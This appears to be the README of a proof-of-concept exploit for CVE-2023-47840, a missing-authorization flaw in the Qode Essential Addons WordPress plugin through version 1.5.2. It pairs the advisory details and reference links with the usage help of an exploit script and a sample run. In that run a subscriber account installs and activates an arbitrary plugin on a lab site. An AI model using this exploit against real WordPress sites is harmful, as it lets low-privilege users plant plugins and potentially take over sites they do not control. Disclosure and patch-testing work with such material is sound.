# CVE-2023-47840
Qode Essential Addons &lt;= 1.5.2 - Missing Authorization to Authenticated (Subscriber+) Arbitrary Plugin Installation/Activation

### Description:
The Qode Essential Addons plugin for WordPress is vulnerable to unauthorized modification of data due to a missing capability check on the install_plugin() function in all versions up to, and including, 1.5.2. This makes it possible for authenticated attackers, with subscriber-level access and above, to install and activate arbitrary plugins.

```
Severity: medium
CVE ID: CVE-2023-47840
CVSS Score: 4.3
CVSS Metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N
Plugin Slug: qode-essential-addons
WPScan URL: https://www.wpscan.com/plugin/qode-essential-addons
Reference URL: https://www.wordfence.com/threat-intel/vulnerabilities/id/443c59b9-275d-4d17-a870-9ae013c1a5c1
SVN Link: https://plugins.trac.wordpress.org/changeset/2996356/qode-essential-addons/trunk/inc/admin/inc/admin-pages/sub-pages/import/class-qodeessentialaddons-framework-import-plugins.php
Patchstack: https://patchstack.com/database/vulnerability/qode-essential-addons/wordpress-qode-essential-addons-plugin-1-5-2-arbitrary-plugin-installation-and-activation-vulnerability
```

How to use
---

```
usage: CVE-2023-47840.py [-h] --url URL --username USERNAME --password PASSWORD --slug SLUG

Qode Essential Addons <= 1.5.2 - Missing Authorization to Authenticated (Subscriber+) Arbitrary Plugin Installation/Activation Description CVE-2023-47840 - The Qode Essential Addons plugin for WordPress is vulnerable to unauthorized
modification of data due to a missing capability check on the install_plugin() function in all versions up to, and including, 1.5.2. This makes it possible for authenticated attackers, with subscriber-level access and above, to
install and activate arbitrary plugins.

options:
  -h, --help           show this help message and exit
  --url URL            URL of the WordPress site
  --username USERNAME  WordPress username
  --password PASSWORD  WordPress password
  --slug SLUG          WordPress Plugin Slug
```

POC
---

```
$ python3 CVE-2023-47840.py --url http://wordpress.lan --username user --password useruser1 --slug olympus-google-fonts
Logged in successfully.
Getting REST API Nonce!
Nonce Found: 1d0f559912
Installing Plugin!
HTTP STATUS: 200 Response:
Activate Plugin!
HTTP STATUS: 200 Response: {"status":"success","message":"Activated","data":null,"redirect":""}
```
